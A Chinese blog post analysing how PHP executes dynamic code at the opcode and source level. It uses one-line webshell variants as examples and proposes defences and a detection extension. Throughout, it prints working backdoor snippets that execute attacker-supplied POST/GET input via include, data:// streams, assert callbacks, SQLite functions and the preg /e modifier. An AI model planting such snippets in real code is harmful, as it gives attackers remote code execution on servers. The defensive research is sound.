# 从PHP源码与扩展开发谈PHP任意代码执行与防御

2 小时前

原文出自我的个人博客：[https:// blog.zsxsoft.com/post/3 0][1] ，个人博客的排版大概更好看一些吧（


PHP的灵活性极强，其可以通过各种意想不到的办法来动态执行代码。正因如此，PHP界的“一句话木马”（“后门”，backdoor），写法极其神奇，充满了脑洞，大部分变种**完全无法**通过静态扫描查到（当然如果用沙盒执行+启发式拦截的方式大概可以，这就变成传统杀毒软件了）。因此，我们不如从这些一句话木马，看看PHP是如何执行动态代码的吧。

先说明，如果只是要在自己服务器上防御的话，可以只看下面几行后关闭这篇文章：

1. 升级到PHP 7.1，该版本对大部分常见的执行动态代码的方法进行了封堵。
1. php.ini中，关闭“allow_url_fopen”。在打开它的情况下，可以通过 phar:// 等协议丢给include，让其执行动态代码。
1. php.ini中，通过disable_functions关闭 exec,passthru,shell_exec,system 等函数，禁止PHP调用外部程序。
1. 永远不要在代码中使用eval。
1. 设置好上传文件夹的权限，禁止从该文件夹执行代码。
1. include 文件的时候，注意文件的来源；需要动态include时做好参数过滤。

当然，本文未经特别标注，全部以PHP 7.1为基础。

先从最简单的一句话木马开始吧：

    <?php eval('1');

这种代码因为用了eval，所以是最好封堵或查杀的。eval不可通过disable_functions关闭，也不可以通过字符串来调用。**它是一个语言特性，而不是一个函数**。用关键字扫描即可解决。

PHP不是解释执行的（即读一行执行一行）。在代码执行前，先要由Zend引擎将其编译为一种中间语言，称之为“OPCode”。我们通过vld扩展（[https:// github.com/derickr/vld][2]），可以在代码执行前看到这一段PHP到底被解析成了什么。

    line     #* E I O op                           fetch          ext  return  operands
    -------------------------------------------------------------------------------------
       1     0  E >   INCLUDE_OR_EVAL                                          '1', EVAL
       2     1      > RETURN                                                   1
    

可以看到的是，这个opcode是“INCLUDE_OR_EVAL”。看看什么东西会被组合成这个opcode：[https://github.com/php-src/php/blob/0eb3c377d49a331282b943dba165b4b9df56fad2/Zend/zend_ast.c#L1256][3]

```c
       case ZEND_AST_INCLUDE_OR_EVAL:    
                switch (ast->attr) {    
                    case ZEND_INCLUDE_ONCE: FUNC_OP("include_once");    
                    case ZEND_INCLUDE:      FUNC_OP("include");    
                    case ZEND_REQUIRE_ONCE: FUNC_OP("require_once");    
                    case ZEND_REQUIRE:      FUNC_OP("require");    
                    case ZEND_EVAL:         FUNC_OP("eval");    
                    EMPTY_SWITCH_DEFAULT_CASE();    
                }    
                break;
```

于是，自然而然地得知了，include / require和eval的效果都一样。于是引申出了以下做法：

    <?php    
    file_put_contents('1.php', '<?php echo "a";');    
    include_once '1.php';

显而易见，这种就显得极难查杀了；如果我们监控了文本文件写，那我们还有许多方式来绕过检测。比如说通过SQLite：

    <?php
    $db = new SQLite3('db.db');
    $db->exec('CREATE TABLE a(b STRING)');
    $db->exec('INSERT INTO a(b) VALUES ("<?php ' . $_GET['a'] . '")');
    $db->close();
    include 'db.db';

这里的防御就显得极为复杂了，因为考虑到现在世界上绝大多数的CMS / 框架的模板都是生成PHP后include的，很难确定保存的文件哪些是用户输入的代码，哪些又不是。

也许，我们可以通过检测用户输入来下手？联想到生物“同位素示踪法”，试试看给用户的输入都打个Tag。不过这不能通过外部Hook执行了，到这里，必须从PHP的扩展下手。

在PHP_RINIT_FUNCTION挂一下，每次访问一个PHP页面的时候，都会执行这个函数。然后从PG(http_globals)[TRACK_VARS_POST]这个数组拿输入数据，就可以拿到用户输入的zval了。

zval是PHP中的数据类型的基本结构，通过Z_STR_P这个宏可以将其转为zend_string。不过zend_string目前和我们没啥关系，不关注它。通过看zval的结构，我们发现可以把flag写在zval里面，正如taint这个扩展所做的一样，直接往zval.u.v.flags里丢东西就好啦。

taint的代码：

```c
    /* {{{ PHP_RINIT_FUNCTION    
    */    
    PHP_RINIT_FUNCTION(taint)    
    {    
      if (SG(sapi_started) || !TAINT_G(enable)) {    
        return SUCCESS;    
      }    
      if (Z_TYPE(PG(http_globals)[TRACK_VARS_POST]) == IS_ARRAY) {    
        php_taint_mark_strings(Z_ARRVAL(PG(http_globals)[TRACK_VARS_POST]));    
      }    
      if (Z_TYPE(PG(http_globals)[TRACK_VARS_GET]) == IS_ARRAY) {    
        php_taint_mark_strings(Z_ARRVAL(PG(http_globals)[TRACK_VARS_GET]));    
      }    
      if (Z_TYPE(PG(http_globals)[TRACK_VARS_COOKIE]) == IS_ARRAY) {    
        php_taint_mark_strings(Z_ARRVAL(PG(http_globals)[TRACK_VARS_COOKIE]));    
      }    
      /* 这里我认为SERVER下的HTTP头也要做个拦截 */
      return SUCCESS;    
    }    
    
    /** php_taint_mark_strings的主要内容是 **/
    #define TAINT_MARK(str)   (GC_FLAGS((str)) |= IS_STR_TAINT_POSSIBLE)
    TAINT_MARK(Z_STR_P(val));
```

不过问题来了——

每个PHP_FUNCTION返回的zval都是全新生成的，新的zval是不继承之前的flag的。这就代表我们必须重写所有的函数……所以无法通过检测用户输入来下手……

那，这里最好的方案也就只有白名单了。这个也不太适合通过外部ptrace等监控PHP的fopen系统调用来实现，还是需要通过扩展。不过目前没有扩展能实现这个白名单机制，我之后会在我的扩展内实现。

但如果关闭了PHP的文件读写，还可以继续执行吗？我们可以追一下代码，很容易就追到了php_resolve_path：[https:// github.com/php-src/php/ blob/0eb3c377d49a331282b943dba165b4b9df56fad2/main/fopen_wrappers.c#L475][4]。于是我们发现我们可以include各种协议，比如说：

    <?php
    include("data://text/plain;base64,".base64_encode($content));

甚至，如果打开phar扩展的话，因为zend_resolve_path函数指针被指去了phar_resolve_path，我们还可以通过构造一个phar来动态执行代码。

这就显得很尴尬了，应该怎么防御呢？在php.ini中，关闭“allow_url_fopen”即可解决。

另外，还有一个通过MySQL来写文件，然后由PHP来include的神奇方案。仅作记录。

使用

    SELECT * INTO OUTFILE

这个SQL语句可以把MySQL查询写到文件里面。在PHP 5.2下，不受open_basedir的限制，可以随便写到任何一个有权限的地方。

暂未确定这个文件是由MySQL写入的还是PHP写入的（因为懒得查），我个人怀疑还是通过PHP进程写入的，因为open_basedir这个php.ini的配置可以神奇地影响到SQL查询。PHP 5.3以及以后版本，其默认mysql驱动为mysqlnd；PHP 5.2为libmysql。使用libmysql的版本不受open_basedir的限制，所以我猜测从外部监控PHP的系统调用就可以查得到。

那我们还可以不通过eval来执行代码嘛，比如说，create_function。

    <?php
    $a = 'phpinfo();';
    call_user_func(create_function(null, $a));

切到Opcode里：

    line     #* E I O op                           fetch          ext  return  operands
    -------------------------------------------------------------------------------------
       1     0  E >   ECHO                                                     'a'
       2     1        ASSIGN                                                   !0, 'phpinfo();'
       3     2        INIT_FCALL                                               'create_function'
             3        SEND_VAL                                                 null
             4        SEND_VAR                                                 !0
             5        DO_ICALL                                         $2
             6        INIT_USER_CALL                                0          'call_user_func', $2
             7        DO_FCALL                                      0
       4     8      > RETURN                                                   1
    

嗯，解决方式是干掉create_function这个函数。这个函数因为特征比较明显（谁没事会从字符串创建函数？）了，所以用的人少一些；assert这一些函数隐蔽的多（断言很常见）。

如：

    <?php
    assert('a');

会生成

    line     #* E I O op                           fetch          ext  return  operands
    -------------------------------------------------------------------------------------
       2     0  E >   ASSERT_CHECK
             1        INIT_FCALL                                               'assert'
             2        SEND_VAL                                                 'a'
             3        DO_ICALL
             4      > RETURN                                                   1
    

它的opcode调用是INIT_FCALL，说明这是一个函数。这也就是说，我们可以通过各种方式对其进行隐藏：

    <?php
    $p = 'a' . ssert';
    $p('phpinfo()');

转到Opcode，就变成

    line     #* E I O op                           fetch          ext  return  operands
    -------------------------------------------------------------------------------------
       2     0  E >   ASSIGN                                                   !0, 'assert'
       3     1        INIT_DYNAMIC_CALL                                        !0
             2        SEND_VAL_EX                                              'phpinfo%28%29'
             3        DO_FCALL                                      0
             4      > RETURN                                                   1
    

还有以下各种变种：


```php
    <?php
    array_map(assign, $_POST);
    register_shutdown_function('assert', $_POST['code']);
    filter_var($_REQUEST['code'], FILTER_CALLBACK, ['options' => 'assert']);
    filter_var_array(['test' => $_REQUEST['code']], ['test' => ['filter' => FILTER_CALLBACK, 'options' => 'assert']]);
```

甚至还可以：

PHP

```php
    <?php
    $db = new SQLite3('db.db');
    $db->createFunction('f', 'assert');
    $stmt = $db->prepare("SELECT f(?)");
    $stmt->bindValue(1, $_POST['code'], SQLITE3_TEXT);
    $stmt->execute();
```

这种方式应该怎么防御呢？就有好几种办法了。

办法一，升级到PHP 7.1即可解决。PHP 7.1“Forbid dynamic calls to scope introspection functions”（[http:// php.net/manual/en/migra tion71.incompatible.php][5]），禁止了所有这种函数的调用。

办法二：

不用PHP 7.1的话还是得写扩展，在老版本PHP上实现新版本的功能。

首先，Hook住以下四个Opcode：ZEND_DO_FCALL ZEND_DO_ICALL ZEND_DO_UCALL ZEND_DO_FCALL_BY_NAME，检测一下调用了什么函数（zend_string_equals_literal(fbc->common.function_name, "print_r")）。所有的动态调用最后都会跑到INIT_DYNAMIC_CALL来，在zend_init_dynamic_call_xxxx里会给它打一个ZEND_CALL_DYNAMIC的flag。所以，当涉及到特殊函数时，就检测一下现在的current_execute_data是不是动态调用的即可。

按照PHP 7.1的逻辑，需要检测：

* assert() - with a string as the first argument
* compact()
* extract()
* func_get_args()
* func_get_arg()
* func_num_args()
* get_defined_vars()
* mb_parse_str() - with one arg
* parse_str() - with one arg

不过这还不够，实际上还有更猥琐的。

PHP 5.4和以下版本的PCRE，支持“//e”这种修饰符来修饰正则，即“PREG_REPLACE_EVAL”

```php
    <?php
    preg_match('/.*/e', $_POST['code'], 'fuck');
```

怎么防御？

办法一，升级到PHP 7。

办法二，Hook住preg_replace、preg_filter函数。只有这两个函数调用了preg_replace_impl，才会用到PREG_REPLACE_EVAL。当然，对于老版本PHP，还需要Hook住ereg_、mb_preg系列函数。

文末最后说一下，因为某些需求（不会部署在自己的服务器上），我需要一套一句话木马检测方案，所以写出了本文以及半成品扩展：[https:// github.com/zsxsoft/fval][6] 。

参考：

1. 深入理解PHP原理之Opcodes [http://www. laruence.com/2008/06/18 /221.html][7]
1. 深入理解PHP7之zval [https://github.com/laruence/php7-internal/blob/master/zval.md][7]
1. 浅谈变形PHP WEBSHELL检测 [https://security.tencent.com/index.php/blog/msg/19][7]
1. MySQL Native Driver [http:// php.net/manual/en/intro .mysqlnd.php][8]

[0]: https://www.zhihu.com/people/zsx
[1]: http://link.zhihu.com/?target=https%3A//blog.zsxsoft.com/post/30
[2]: http://link.zhihu.com/?target=https%3A//github.com/derickr/vld
[3]: http://link.zhihu.com/?target=http%3A//php.net/manual/en/internals2.opcodes.include-or-eval.php
[4]: http://link.zhihu.com/?target=https%3A//github.com/php-src/php/blob/0eb3c377d49a331282b943dba165b4b9df56fad2/main/fopen_wrappers.c%23L475
[5]: http://link.zhihu.com/?target=http%3A//php.net/manual/en/migration71.incompatible.php
[6]: http://link.zhihu.com/?target=https%3A//github.com/zsxsoft/fval
[7]: http://link.zhihu.com/?target=http%3A//www.laruence.com/2008/06/18/221.html
[8]: http://link.zhihu.com/?target=http%3A//php.net/manual/en/intro.mysqlnd.php